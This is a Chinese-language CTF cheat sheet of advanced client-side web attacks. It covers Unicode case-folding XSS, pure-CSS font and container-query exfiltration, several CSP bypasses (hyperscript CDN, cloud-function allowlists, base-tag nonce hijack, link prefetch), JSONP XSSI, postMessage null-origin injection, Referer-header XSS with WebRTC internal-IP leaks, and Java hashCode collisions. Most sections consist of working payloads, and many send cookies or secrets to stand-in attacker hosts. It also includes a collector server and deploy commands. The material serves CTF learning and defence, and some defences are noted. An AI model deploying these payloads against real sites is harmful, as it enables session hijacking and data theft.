# CTF Web - 进阶客户端攻击

Unicode 绕过、纯 CSS 外带、行为式 JS 框架、时序 oracle、HMAC 绕过、CSP 绕过与 XSSI 技巧。

## 目录
- [Unicode 大小写折叠 XSS 绕过（UNbreakable 2026）](#unicode-大小写折叠-xss-绕过unbreakable-2026)
- [CSS 字体字形宽度 + 容器查询外带（UNbreakable 2026）](#css-字体字形宽度--容器查询外带unbreakable-2026)
- [Hyperscript CDN CSP 绕过（UNbreakable 2026）](#hyperscript-cdn-csp-绕过unbreakable-2026)
- [通过 postMessage 的 PBKDF2 前缀时序 oracle（UNbreakable 2026）](#通过-postmessage-的-pbkdf2-前缀时序-oracleunbreakable-2026)
- [借泄露的 JS 密钥绕过客户端 HMAC（Codegate 2013）](#借泄露的-js-密钥绕过客户端-hmaccodegate-2013)
- [终端控制字符混淆（SECCON 2015）](#终端控制字符混淆seccon-2015)
- [通过云函数白名单域名绕过 CSP（BSidesSF 2025）](#通过云函数白名单域名绕过-cspbsidessf-2025)
- [通过 base 标签劫持绕过 CSP Nonce（BSidesSF 2026）](#通过-base-标签劫持绕过-csp-noncebsidessf-2026)
- [借 JSONP 回调的 XSSI + 云函数外带（BSidesSF 2026）](#借-jsonp-回调的-xssi--云函数外带bsidessf-2026)
- [通过 link prefetch 绕过 CSP（Boston Key Party 2016）](#通过-link-prefetch-绕过-cspboston-key-party-2016)
- [共享父域 Cookie 注入导致的跨源 XSS（0CTF 2017）](#共享父域-cookie-注入导致的跨源-xss0ctf-2017)
- [Chrome Unicode URL 规范化绕过（RCTF 2017）](#chrome-unicode-url-规范化绕过rctf-2017)
- [借十进制 IP 与方括号记法绕过点号过滤（33C3 CTF 2016）](#借十进制-ip-与方括号记法绕过点号过滤33c3-ctf-2016)
- [Referer 头注入导致 XSS（Tokyo Westerns 2017）](#referer-头注入导致-xsstokyo-westerns-2017)
- [利用 Java hashCode() 碰撞绕过认证（CSAW 2017）](#利用-java-hashcode-碰撞绕过认证csaw-2017)
- [CSS @font-face unicode-range 数据外带（Harekaze CTF 2018）](#css-font-face-unicode-range-数据外带harekaze-ctf-2018)
- [通过 data URI iframe 的 postMessage null 源绕过（BackdoorCTF 2018）](#通过-data-uri-iframe-的-postmessage-null-源绕过backdoorctf-2018)
- [借攻击者可控 MIME 类型加载同源脚本绕过 CSP（Midnight Sun CTF Finals 2018）](#借攻击者可控-mime-类型加载同源脚本绕过-cspmidnight-sun-ctf-finals-2018)
- [通过 __reactInternalInstance$ 提取 React 组件状态（RCTF 2018）](#通过-__reactinternalinstance-提取-react-组件状态rctf-2018)
- [借 .js 用户名 + 存储型 self-XSS 投毒 CloudFlare 缓存（CONFidence 2019 Teaser）](#借-js-用户名--存储型-self-xss-投毒-cloudflare-缓存confidence-2019-teaser)

---

<a id="modern-browser-trust-boundary-additions-20252026"></a>
## 现代浏览器信任边界补充（2025/2026）

<a id="popup-message-and-opener-confusion"></a>
### 弹窗消息与 opener 混淆

许多现代题目的前端允许子弹窗向父页面回传 token 或回调，却不校验源。这通常是浏览器信任边界缺陷，而不是后端密码学缺陷。

```javascript
window.addEventListener('message', function (event) {
  if (event.data && event.data.token) {
    setCookie(event.data.token);
  }
});
```

**防护：** 对精确白名单校验 `event.origin`，要求 `event.source === popup`，除了一次性 nonce 之外不要把原始 token 放进 URL fragment。

<a id="blob--data-url-content-confusion"></a>
### `Blob` / `data:` URL 内容混淆

有些应用从用户可控来源读取生成内容后，错误地信任 `blob:` 或 `data:` URL。当浏览器在 MIME 混淆后把响应当作 HTML、脚本或图片执行时，就变得危险。

**检查：**
- 校验 `Content-Type` 与 `X-Content-Type-Options`
- 检查页面和 iframe 中的 `URL.createObjectURL` / `data:` 流程
- 找攻击者可控的文件名或 MIME 嗅探路径，把文本变成可执行内容

<a id="oauth-popup--state-reuse-confusion"></a>
### OAuth 弹窗与 state 复用混淆

应用只保存部分 `state`、或使用羸弱的重定向匹配函数时，浏览器可能把控制权从一次 OAuth 流程交到另一次。若 state 未完全绑定会话与 client ID，某次流程的回调可能被另一次流程接受。

**检查清单：**
- `client_id` 精确匹配
- `redirect_uri` 精确匹配
- nonce/state 必须每次登录唯一且一次性

<a id="redirect-based-auth-and-login-poisoning"></a>
### 基于重定向的认证与登录投毒

登录后重定向到用户可控 URL 的页面，可能携带一个之后被解释为用户名、账号 ID 或会话标识的值。这是经典的"先重定向再信任"缺陷。

**找这些：**
- `?next=`、`?redirect=`、`?return=` 参数
- 保留 URL 中路径片段的登录回调流程
- 只校验后缀的子域重定向校验

---

<a id="unicode-case-folding-xss-bypass-unbreakable-2026"></a>
## Unicode 大小写折叠 XSS 绕过（UNbreakable 2026）

**模式（demolition）：** 服务端净化器（Flask 正则 `<\s*/?\s*script`）只匹配 ASCII。第二层处理（Go 的 `strings.EqualFold`）做 Unicode 大小写折叠，会把 `ſ`（U+017F，拉丁长 s）规范化为 `s`。

**Payload：**
```html
<ſcript>location='https://webhook.site/ID?c='+document.cookie</ſcript>
```

**原理：**
1. Flask 正则检查 `<script`——`<ſcript` 不匹配（ASCII 正则里 ſ ≠ s）
2. Go 的 `strings.EqualFold` 把 `ſ` 规范化为 `s`，`<ſcript>` 被当作 `<script>`
3. 前端通过 `innerHTML` 插入——浏览器解析这个此刻已合法的 script 标签

**其他可用于绕过的 Unicode 折叠对：**
- `ſ`（U+017F）-> `s` / `S`
- `ı`（U+0131）-> `i` / `I`
- `ﬁ`（U+FB01）-> `fi`
- `K`（U+212A，开尔文符号）-> `k` / `K`

**要点：** 不同层采用不同的规范化标准（纯 ASCII 正则 vs Unicode 大小写折叠）会制造绕过机会。先弄清每一层做了什么处理。

---

<a id="css-font-glyph-width--container-query-exfiltration-unbreakable-2026"></a>
## CSS 字体字形宽度 + 容器查询外带（UNbreakable 2026）

**模式（larpin）：** 不执行 JavaScript，通过 CSS 注入外带内联脚本内容（如 `window.__USER_CONFIG__`）。用自定义字体的字形宽度加 CSS 容器查询充当 oracle。

**技术要点：**
1. **目标选择**——CSS 选择器定位内联脚本：`script:not([src]):has(+script[src*='purify'])`
2. **自定义字体**——每个字符字形的推进宽度唯一：`width = (char_index + 1) * 1536` 字体单位
3. **容器查询 oracle**——外层元素使用 `container-type: inline-size`。容器查询命中特定宽度区间时触发 background-image 请求：
```css
@container (min-width: 150px) and (max-width: 160px) {
  .probe { background: url('https://attacker.com/?char=a&pos=0'); }
}
```
4. **逐字符探测**——遍历位置，每次探测依据测得的宽度收敛到一个字符

**要点：** CSS 容器查询（无需 JavaScript）配合自定义字体度量，可为文本内容构造像素级精确的 oracle。即使严格 CSP 拦截所有脚本也依然有效。

---

<a id="hyperscript-cdn-csp-bypass-unbreakable-2026"></a>
## Hyperscript CDN CSP 绕过（UNbreakable 2026）

**模式（minegamble）：** CSP 允许 `cdnjs.cloudflare.com` 的脚本。Hyperscript（`_hyperscript`）会在 HTML 净化之后于客户端处理 `_=` 属性，从而实现"净化后"代码执行。

**Payload：**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script>
<div _="on load fetch '/api/ticket' then put document.cookie into its body"></div>
```

**原理：**
1. HTML 通过净化器（无内联脚本、无事件处理器）
2. Hyperscript 库从 CDN 加载（CSP 允许）
3. Hyperscript 扫描 DOM 中的 `_=` 属性并作为行为指令执行
4. `on load` 触发任意动作，包括 fetch、DOM 操作、Cookie 访问

**要点：** Hyperscript、Alpine.js（`x-data`、`x-init`）、htmx（`hx-get`、`hx-trigger`）这类声明式 JS 框架会执行净化器不认识的 HTML 属性中的代码。只要 CSP 允许任意 CDN 托管的行为式框架，就能同时绕过 CSP 和 HTML 净化器。

---

<a id="pbkdf2-prefix-timing-oracle-via-postmessage-unbreakable-2026"></a>
## 通过 postMessage 的 PBKDF2 前缀时序 oracle（UNbreakable 2026）

**模式（svfgp）：** 服务端检查 `secret.startsWith(candidate)`，而校验过程涉及昂贵的 PBKDF2（300 万次迭代）。不匹配时快速返回；匹配时跑完整个 KDF，形成可测量的时序差异。

**通过 postMessage 外带：**
1. 在弹窗中打开目标页面
2. 对每个字符位置，探测所有候选（`a-z0-9_}`）
3. 通过 `postMessage` / 响应时序测量往返时间
4. 延迟最高的字符 = 正确的前缀匹配

```javascript
async function probeChar(known, candidates) {
  const timings = {};
  for (const c of candidates) {
    const start = performance.now();
    // Navigate popup to verification endpoint with candidate prefix
    popup.location = `${TARGET}/verify?prefix=${known}${c}`;
    await waitForResponse();  // postMessage or load event
    timings[c] = performance.now() - start;
  }
  return Object.entries(timings).sort((a, b) => b[1] - a[1])[0][0];
}
```

**要点：** 任何由短路前缀检查保护的昂贵服务端操作（PBKDF2、bcrypt、Argon2）都会形成时序 oracle。`startsWith` 快速失败与跑满 KDF 的时序差，可跨源通过弹窗导航时序测得。

---

<a id="client-side-hmac-bypass-via-leaked-js-secret-codegate-2013"></a>
## 借泄露的 JS 密钥绕过客户端 HMAC（Codegate 2013）

**模式：** 应用在客户端构造带 HMAC 参数的请求 URL。密钥硬编码在混淆过的 JavaScript 里。

**攻击步骤：**
1. 反混淆客户端 JS（jsbeautifier.org 或浏览器 DevTools 美化打印）
2. 定位签名函数，提取硬编码密钥
3. 直接在浏览器控制台调用泄露的函数，为任意请求伪造合法签名

```javascript
// Discovered in deobfuscated main.js:
function buildUrl(page) {
    var sig = calcSHA1(page + "Ace in the Hole");  // Hardcoded secret
    return "/load?p=" + page + "&s=" + sig;
}

// Exploit: call the leaked global function in browser console
var forgedUrl = "/load?p=index.php&s=" + calcSHA1("index.php" + "Ace in the Hole");
// Fetching index.php via the p parameter returns raw PHP source code
```

**要点：** 客户端 HMAC/签名方案本质上就会泄露密钥——签名密钥必须在 JavaScript 里。反混淆 JS、取出密钥，然后为任意参数值伪造签名。在浏览器控制台里留意 `calcSHA1`、`hmac`、`sign` 之类的全局函数。

---

<a id="terminal-control-character-obfuscation-seccon-2015"></a>
## 终端控制字符混淆（SECCON 2015）

服务端响应可能用 ASCII 退格符（0x08）隐藏数据。终端把 `S\x08 ` 渲染成空格（覆盖掉 'S'），正常显示时 flag 看不见。读原始字节即可提取：

```python
import socket
s = socket.socket()
s.connect((host, port))
data = s.recv(4096)
flag = data.replace(b'\x08', b'').replace(b' ', b'')
# Or: filter only printable chars that aren't followed by backspace
```

---

<a id="csp-bypass-via-cloud-function-whitelisted-domain-bsidessf-2025"></a>
## 通过云函数白名单域名绕过 CSP（BSidesSF 2025）

当 Content-Security-Policy 白名单包含云平台域名（如 `*.us-central1.run.app`、`*.cloudfunctions.net`、`*.azurewebsites.net`）：

1. 把恶意脚本部署到被白名单的云平台
2. 通过 `<script src="https://your-func-xxxxx.us-central1.run.app">` 加载——通过 CSP
3. 从存在漏洞的页面外带数据

```python
# Google Cloud Function that serves exfiltration JS
def serveIt(request):
    js = """
    var xhr = new XMLHttpRequest();
    xhr.open('GET', location.origin + '/admin/secret', true);
    xhr.onload = function() {
        fetch('https://attacker.com/log?flag=' + encodeURIComponent(xhr.responseText));
    };
    xhr.send(null);
    """
    return (js, 200, {'Content-Type': 'application/javascript',
                       'Access-Control-Allow-Origin': '*'})
```

部署命令：`gcloud functions deploy serveIt --runtime python39 --trigger-http --allow-unauthenticated`。

**要点：** 云平台域名是共享基础设施。在 CSP 里白名单 `*.run.app` 或 `*.cloudfunctions.net`，等于允许任何攻击者部署的函数来提供脚本。云托管应用应优先用基于 nonce 或基于 hash 的 CSP，而不是域名白名单。

---

<a id="csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026"></a>
## 通过 base 标签劫持绕过 CSP Nonce（BSidesSF 2026）

**模式（web-tutorial-2）：** CSP 用 `script-src 'nonce-xxx'` 把脚本执行限制在带 nonce 的脚本上。但 CSP 缺少 `base-uri` 指令。如果你能在某个从相对 URL 加载的 nonce 脚本之前注入 HTML，就可以注入 `<base>` 标签把相对 URL 重定向到你的服务器。

**有缺陷的 CSP：**
```text
Content-Security-Policy: script-src 'nonce-abc123'; default-src 'self'
```
注意：没有 `base-uri` 指令。

**有缺陷的页面 HTML：**
```html
<!-- Attacker injects here via stored XSS, parameter injection, etc. -->
<base href="https://attacker.com/">
<!-- ... later in the page ... -->
<script nonce="abc123" src="test.js"></script>
```

**原理：**
1. `<base href="https://attacker.com/">` 改变页面上所有相对 URL 的基准
2. 浏览器遇到 `<script nonce="abc123" src="test.js">` 时，把 `test.js` 按新基准解析 -> `https://attacker.com/test.js`
3. 该脚本带有合法 nonce，CSP 放行
4. 脚本从攻击者服务器加载，执行任意 JavaScript

**利用准备：**
```python
# Host malicious test.js on attacker server
# test.js content:
"""
fetch('/api/flag')
  .then(r => r.text())
  .then(f => fetch('https://webhook.site/YOUR_ID?flag=' + encodeURIComponent(f)));
"""
```

**注入 payload：**
```html
<base href="https://attacker.com/">
```

**要点：** `<base>` 标签影响页面上所有相对 URL，包括带 nonce 的脚本。CSP 的 `script-src 'nonce-xxx'` 只校验 nonce 匹配——**不**限制脚本从哪里加载（那需要带域名限制的 `script-src`）。CSP 中没有 `base-uri 'self'` 或 `base-uri 'none'` 时，任何在相对 URL nonce 脚本之前的 HTML 注入点都能实现完整 CSP 绕过。

**防御：** 使用 nonce 的 CSP 策略始终包含 `base-uri 'self'` 或 `base-uri 'none'`。这能阻止 `<base>` 标签注入重定向脚本源。

**识别：** 检查 CSP 是否为 `script-src 'nonce-...'` 且缺少 `base-uri` 指令。找出现在潜在注入点之后的、带 nonce 的 `<script src="相对.js">` 标签（相对 URL，而非绝对）。

**参考：** BSidesSF 2026 "web-tutorial-2"

---

<a id="xssi-via-jsonp-callback-with-cloud-function-exfiltration-bsidessf-2026"></a>
## 借 JSONP 回调的 XSSI + 云函数外带（BSidesSF 2026）

**模式（three-questions-3）：** 多阶段攻击链：
1. **Cookie 哈希反推：** 用户 ID Cookie 是 `SHA1(数字ID)`，ID 是小整数（1-100000）。爆破哈希反推出数字 ID。
2. **调试端点 IDOR：** `/debug/game-state?user_id=<数字ID>` 返回游戏状态（通过 HTML 注释 + robots.txt 发现）。
3. **XSSI 外带：** 管理员的游戏状态通过跨站脚本包含（XSSI）外带。类似 JSONP 的端点（`/characters.js?callback=leak`）把响应数据包进函数调用。借管理员留言功能注入 `<script src>` 标签加载该端点并指定自定义回调，回调把数据转发到攻击者控制的云函数。

```html
<!-- Injected via /admin-message endpoint -->
<script>
function leak(data) {
    // Exfiltrate to attacker's cloud function
    new Image().src = "https://attacker.cloudfunctions.net/exfil?d=" +
        encodeURIComponent(JSON.stringify(data));
}
</script>
<script src="/characters.js?callback=leak"></script>
```

```python
# Step 1: Brute-force SHA1 cookie to recover numeric user ID
import hashlib

cookie_hash = "a1b2c3d4..."  # From document.cookie
for i in range(1, 100001):
    if hashlib.sha1(str(i).encode()).hexdigest() == cookie_hash:
        print(f"User ID: {i}")
        break

# Step 2: Access debug endpoint
# GET /debug/game-state?user_id={recovered_id}
```

**要点：** XSSI（跨站脚本包含）利用的是返回 JavaScript（JSONP 回调、JS 变量赋值）且含敏感数据的端点。与 XSS 不同，XSSI 不需要把脚本注入目标页面——它是跨源加载目标的脚本。JSONP 端点的 `callback` 参数是经典向量。配合会访问攻击者页面的管理机器人，可实现服务端数据外带。

**何时识别：** 应用有 JSONP 端点或提供带动态数据的 JavaScript 文件。CSP 可能允许同源 `script-src`。找 `?callback=` 或 `?jsonp=` 参数。典型攻击链是：弱 Cookie 哈希 -> IDOR -> XSSI -> 带外外带。

**防御：** 禁用 JSONP/callback 参数。返回 `Content-Type: application/json`（而非 `application/javascript`）。加 `X-Content-Type-Options: nosniff`。用规范的 CORS 取代 JSONP。

---

<a id="csp-bypass-via-link-prefetch-boston-key-party-2016"></a>
## 通过 link prefetch 绕过 CSP（Boston Key Party 2016）

`<link rel="prefetch">` 不受 CSP `script-src` 指令拦截，可实现无脚本数据外带：

```html
<link rel="prefetch" href="http://attacker.com/steal?data=SECRET">
<meta http-equiv="refresh" content="0; url=http://attacker.com/steal">
```

**要点：** CSP 限制脚本执行，但不限制导航或资源预取。当存在 XSS 但 `script-src` 拦截内联/远程 JS 时，用 `<link rel="prefetch">` 或 `<meta http-equiv="refresh">` 做无脚本外带。数据通过 URL 参数或 `Referer` 头送出。

---

<a id="cross-origin-xss-via-shared-parent-domain-cookie-injection-0ctf-2017"></a>
## 共享父域 Cookie 注入导致的跨源 XSS（0CTF 2017）

**模式（complicated xss）：** 当攻击者可访问的页面与 XSS 目标共享二级域名（如 `user.example.vip` 与 `admin.example.vip`）时，用 `domain=.example.vip` 设置的 Cookie 会同时发送到两个子域。先在攻击者可访问的页面上通过 Cookie 值注入 XSS payload，再把受害者重定向到管理界面，Cookie 在那里被渲染成 XSS。

```javascript
// On attacker-accessible subdomain: set cookie for shared parent domain
document.cookie = 'username=<script src=//example.invalid/payload.js></script>; path=/; domain=.example.invalid;';
// Redirect victim to admin interface on sibling subdomain
window.top.location = 'http://admin.example.invalid:8000';

// In payload.js: bypass sandbox by stealing XMLHttpRequest from iframe
var iframe = document.createElement('iframe');
iframe.src = 'about:blank';
document.body.appendChild(iframe);
window.XMLHttpRequest = iframe.contentWindow.XMLHttpRequest;
// Now use restored XMLHttpRequest to exfiltrate admin data
```

**要点：** 域作用域 Cookie 会跨子域边界。只要任一子域未经净化地反射 Cookie 值，从另一个子域设置恶意 Cookie 就能在目标上实现 XSS。当沙箱环境覆写了 `XMLHttpRequest` 时，iframe 技巧可把它恢复回来。

---

<a id="chrome-unicode-url-normalization-bypass-rctf-2017"></a>
## Chrome Unicode URL 规范化绕过（RCTF 2017）

**模式：** Chrome 在处理 URL 时（IDNA/punycode 规范化）会把某些 Unicode 字符规范化为 ASCII 等价物。这可能绕过应用对域名或 URL 组件施加的长度限制或字符过滤。

**模糊测试 Unicode 到 ASCII 的映射：**
```python
# Fuzz Unicode chars that Chrome normalizes to specific ASCII
import unicodedata

target_char = 'a'  # Find Unicode chars that normalize to 'a'
results = []
for cp in range(0x100, 0xffff):
    c = chr(cp)
    # NFKC normalization (what browsers use for IDNA)
    normalized = unicodedata.normalize('NFKC', c)
    if normalized == target_char:
        results.append(f"U+{cp:04X} ({c}) -> {target_char}")

for r in results:
    print(r)
```

**已知有用的映射：**
```text
# Characters that normalize to ASCII equivalents:
U+FF41 (ａ) -> a    # Fullwidth Latin Small Letter A
U+FF42 (ｂ) -> b    # Fullwidth Latin Small Letter B
...
U+FF5A (ｚ) -> z    # Fullwidth Latin Small Letter Z
U+2100 (℀) -> a/c   # Account Of
U+2101 (℁) -> a/s   # Addressed to the Subject
U+FF0F (／) -> /    # Fullwidth Solidus
U+FF1A (：) -> :    # Fullwidth Colon
```

**利用场景：**
```python
# Application enforces max 6-character domain
# Unicode domain uses 6 chars but normalizes to 8+ ASCII chars
unicode_domain = "\uff41\uff42\uff43\uff44\uff45\uff46"  # 6 fullwidth chars
# Chrome normalizes to: "abcdef" (6 ASCII chars)
# But some checks see: 6 Unicode code points

# Bypass character filter on domain
# Application blocks 'x' in domain names
# Use fullwidth 'ｘ' (U+FF58) instead
url = "http://e\uff58ample.com/payload"
# Chrome normalizes to http://example.com/payload
```

**要点：** Chrome 的 IDNA/punycode 规范化会把某些 Unicode 字符转成 ASCII 等价物。一个 6 字符的 Unicode 域名可能解析成 8 字符的 ASCII 域名，绕过应用施加的长度检查。全角拉丁字符（U+FF00–U+FF5E）尤其有用，因为它们与 ASCII 一一对应。任何未采用与浏览器相同规范化的客户端 URL 校验都受此影响。

---

<a id="xss-dot-filter-bypass-via-decimal-ip-and-bracket-notation-33c3-ctf-2016"></a>
## 借十进制 IP 与方括号记法绕过点号过滤（33C3 CTF 2016）

**模式（yoso）：** 当 XSS 过滤器剥离 URL 中的点号（从而拦截 `attacker.com` 和 `document.cookie`）时，用这些办法绕过：(1) 把 IP 地址转成十进制格式（`92.123.45.67` → 单个整数），URL 里就没有任何点号。(2) 用 JavaScript 方括号记法访问属性：`window["location"]`、`document["cookie"]`。(3) 用 `"str"["concat"]()` 取代 `+` 运算符做字符串拼接。

```html
<!-- Filter blocks dots, breaking: document.cookie, attacker.com -->
<!-- Bypass: decimal IP + bracket notation -->
<script>
  window["location"] = "http://1551576387/"["concat"](document["cookie"])
</script>

<!-- Decimal IP conversion: -->
<!-- 92*256^3 + 123*256^2 + 45*256 + 67 = 1551576387 -->
<!-- http://1551576387/ resolves to 92.123.45.67 -->
```

**要点：** 十进制 IP 地址在 URL 中合法且不含点号。配合 JavaScript 的方括号记法（用字符串键代替点访问），可绕过任何针对点号的过滤器。

---

<a id="xss-via-referer-header-injection-tokyo-westerns-2017"></a>
## Referer 头注入导致 XSS（Tokyo Westerns 2017）

**模式：** HTTP `Referer` 头未经净化地被反射进 `<meta http-equiv="refresh">` 标签（或其他 HTML 上下文），导致 XSS。再结合 WebRTC ICE candidate 泄露，可发现服务器内网 IP，进而 SSRF 访问仅限 localhost 的端点。

```html
<!-- Vulnerable page template — Referer header reflected verbatim: -->
<meta http-equiv="refresh" content="0; url=REFERER_VALUE">

<!-- Inject XSS by sending a crafted Referer: -->
<!-- Referer: javascript:alert(document.cookie) -->
<!-- Produces: <meta http-equiv="refresh" content="0; url=javascript:alert(document.cookie)"> -->
```

```python
import requests

TARGET = "http://target/page"

# Step 1: XSS via Referer in meta refresh context
xss_payload = "javascript:fetch('https://attacker.com/?c='+document.cookie)"
r = requests.get(TARGET, headers={"Referer": xss_payload})
# If target reflects Referer into meta refresh, victim browser executes the JS
```

**结合 WebRTC 内网 IP 泄露：**
```javascript
// WebRTC ICE candidates leak internal IPs without user interaction
// Inject this payload to discover internal network topology
var pc = new RTCPeerConnection({
    iceServers: [{urls: "stun:stun.l.google.com:19302"}]
});
pc.createDataChannel("");
pc.createOffer().then(o => pc.setLocalDescription(o));
pc.onicecandidate = function(ice) {
    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
    // Candidate string contains internal IP: "192.168.x.x" or "10.x.x.x"
    fetch('https://attacker.com/?ip=' + encodeURIComponent(ice.candidate.candidate));
};
```

```bash
# Full attack chain:
# 1. Find page that reflects Referer without sanitization
curl -v -H "Referer: test_marker" http://target/page 2>&1 | grep "test_marker"

# 2. Inject XSS payload that runs WebRTC to leak internal IP
# 3. Use leaked internal IP for SSRF to localhost:80 or internal services
# e.g., http://192.168.1.1/admin — accessible only from internal network
```

**要点：** `Referer` 头很少被净化，因为传统意义上它不被视为"用户输入"。当它被反射进 `<meta refresh>`、`<script>` 或 URL 属性时，就会导致 XSS。WebRTC 的 `RTCPeerConnection` ICE candidate 无需用户交互或特殊权限即可泄露内网 IP——在获得初始 XSS 后可用于探测内网。

---

<a id="java-hashcode-collision-for-auth-bypass-csaw-2017"></a>
## 利用 Java hashCode() 碰撞绕过认证（CSAW 2017）

**模式：** Java 的 `String.hashCode()` 使用以 31 为基的多项式滚动哈希，配合 32 位整数溢出。密钥空间小、结构简单，找碰撞轻而易举。当应用用 `hashCode()` 做密码比较或 token 校验时，伪造一个碰撞字符串即可。

```java
// Java hashCode formula:
// h = 0
// for each char c: h = 31 * h + c  (with 32-bit overflow)

// Vulnerable authentication:
if (password.hashCode() == storedHash) {
    grantAccess();   // WRONG: hashCode collisions trivially found
}
```

```python
def java_hashcode(s):
    """Replicate Java's String.hashCode() in Python."""
    h = 0
    for c in s:
        h = (31 * h + ord(c)) & 0xFFFFFFFF
    # Handle Java's signed 32-bit integer behavior
    if h >= 0x80000000:
        h -= 0x100000000
    return h

# Verify: known collision pair
target = "Pas$ion"
assert java_hashcode("ParDJon") == java_hashcode(target)
print(f"hashCode('ParDJon') = {java_hashcode('ParDJon')}")
print(f"hashCode('Pas$ion') = {java_hashcode(target)}")
# Both return the same value

# Find collisions for an arbitrary target string:
target_hash = java_hashcode("secretPassword")

# Brute-force short strings:
import itertools, string
charset = string.printable.strip()
for length in range(4, 9):
    for candidate in itertools.product(charset, repeat=length):
        s = ''.join(candidate)
        if java_hashcode(s) == target_hash:
            print(f"Collision found: '{s}'")
            break
```

**已知碰撞对：**
```text
"Aa"   == "BB"        (hashCode = 2112)
"AaBB" == "BBAa"      (longer collision)
"ParDJon" == "Pas$ion"
```

**系统性构造碰撞：**
```python
# For any two characters a, b where ord(a)*31 + ord(b) == ord(c)*31 + ord(d):
# The strings ending in "ab" and "cd" will have the same hash contribution
# Exploit: find char pairs with equal (31*h + ord(c)) mod 2^32

# Quick collision finder for 2-char suffix:
def find_collision(target_str):
    target_h = java_hashcode(target_str)
    for c1 in range(32, 127):
        for c2 in range(32, 127):
            candidate = target_str[:-1] + chr(c1) + chr(c2)
            # ... adjust prefix to match hash
    pass
```

**要点：** 由于简单的多项式结构和 32 位溢出，Java `hashCode()` 的碰撞极其容易。绝不要用它做安全敏感比较（密码、token、签名）。碰撞空间很稠密——对大多数哈希值都存在大量短碰撞串。`hashCode()` 只应用于哈希表分桶，绝不可用于相等性/认证校验。

**识别：** Java 源码里出现 `password.hashCode() == storedHash`、用 `token.hashCode()` 比较 token，或任何用 `.hashCode()` 代替 `equals()` + 安全哈希（bcrypt、PBKDF2 等）的安全校验。

---

<a id="css-font-face-unicode-range-data-exfiltration-harekaze-ctf-2018"></a>
## CSS @font-face unicode-range 数据外带（Harekaze CTF 2018）

**模式：** 为每个字符定义一个 `@font-face`，其 `unicode-range` 恰好匹配一个码点。当无头浏览器（或管理机器人）渲染含目标文本的元素时，浏览器会为实际出现的每个字符拉取不同的字体 URL。攻击者服务器日志即可揭示目标元素中存在哪些字符。

```css
/* Each @font-face triggers a fetch only if that character exists in .target */
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=a'); unicode-range: U+0061; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=b'); unicode-range: U+0062; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=c'); unicode-range: U+0063; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=0'); unicode-range: U+0030; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=1'); unicode-range: U+0031; }
/* ... one per character in the target alphabet ... */
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=_'); unicode-range: U+005F; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=%7B'); unicode-range: U+007B; } /* { */
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=%7D'); unicode-range: U+007D; } /* } */

/* Apply the font to the element containing the secret */
.target { font-family: exfil; }
```

```python
# Generate the full @font-face CSS payload
import string

charset = string.ascii_lowercase + string.digits + "_{}"
css_rules = []
for c in charset:
    code_point = f"U+{ord(c):04X}"
    encoded_c = c if c.isalnum() else f"%{ord(c):02X}"
    css_rules.append(
        f"@font-face {{ font-family: exfil; "
        f"src: url('http://attacker.com/leak?c={encoded_c}'); "
        f"unicode-range: {code_point}; }}"
    )
css_rules.append(".target { font-family: exfil; }")
payload = "\n".join(css_rules)

# Host as CSS file — MUST serve with Content-Type: text/css for cross-origin
# Inject via: <link rel="stylesheet" href="http://attacker.com/exfil.css">
# Or via CSS injection: <style>@import url('http://attacker.com/exfil.css');</style>
```

```python
# Server-side: collect leaked characters
from flask import Flask, request

app = Flask(__name__)
leaked_chars = set()

@app.route('/leak')
def leak():
    c = request.args.get('c', '')
    leaked_chars.add(c)
    print(f"Leaked chars so far: {''.join(sorted(leaked_chars))}")
    # Return a minimal valid font file (or 404 — the request itself is the leak)
    return '', 204

app.run(host='0.0.0.0', port=80)
```

**局限与变通：**
```text
# unicode-range leaks character SET, not order or count
# Leaked: {a, c, f, g, l, _} from "flag_cfg" — no positional info

# To recover ordering, combine with CSS positional tricks:
# 1. Use ::first-letter with a unique font to leak position 1
# 2. Use text-indent + overflow: hidden tricks to isolate characters
# 3. Chain with :nth-child selectors if target chars are in separate elements
```

**要点：** 带 `unicode-range` 的 CSS `@font-face` 只为目标元素中实际存在的字符触发字体拉取。在拦截脚本但允许 `style-src` 的严格 CSP 下依然有效。跨源 CSS 必须带 `Content-Type: text/css`。它泄露的是字符集合（不是顺序），若需要顺序就配合 CSS 定位技巧。更精确的纯 CSS oracle 见 [CSS 字体字形宽度 + 容器查询外带](#css-字体字形宽度--容器查询外带unbreakable-2026)。

---

<a id="postmessage-null-origin-bypass-via-data-uri-iframe-backdoorctf-2018"></a>
### 通过 data URI iframe 的 postMessage null 源绕过（BackdoorCTF 2018）

**模式：** Web 应用校验 `postMessage` 源时，`data:` URI iframe 的源是 `null`，可绕过同源检查。很多 postMessage 处理器只检查 `event.origin !== expected`，没考虑 `null` 源，于是可从沙箱上下文注入。

**有缺陷的处理器写法：**
```javascript
// Target application's message handler:
window.addEventListener('message', function(event) {
    // Weak origin check — doesn't handle null origin
    if (event.origin === 'http://trusted.com' || !event.origin) {
        // Process message — renders user-controlled HTML/JS
        document.getElementById('content').innerHTML = event.data.details.sender_username;
    }
});
```

**通过 data: URI iframe 利用：**
```html
<iframe src="data:text/html,<script>
var w = window.open('http://target/page');
setTimeout(function(){
    w.postMessage({type:'audio', details:{
        sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
    }, '*');
}, 1000);
</script>"></iframe>
```

**备选：沙箱 iframe 方案：**
```html
<!-- sandbox attribute without allow-same-origin also produces null origin -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
    parent.postMessage({type:'audio', details:{
        sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
    }, '*');
</script>
"></iframe>
```

```python
# Host the exploit page on attacker server
exploit_html = '''
<html><body>
<iframe src="data:text/html,
<script>
var w = window.open('http://target/messages');
setTimeout(function(){
    w.postMessage({
        type: 'audio',
        details: {
            sender_username: '<img src=x onerror=fetch(`http://attacker.com/steal?c=`+document.cookie)>'
        }
    }, '*');
}, 1500);
</script>
"></iframe>
</body></html>
'''
# Serve this page, then send the URL to the admin bot
```

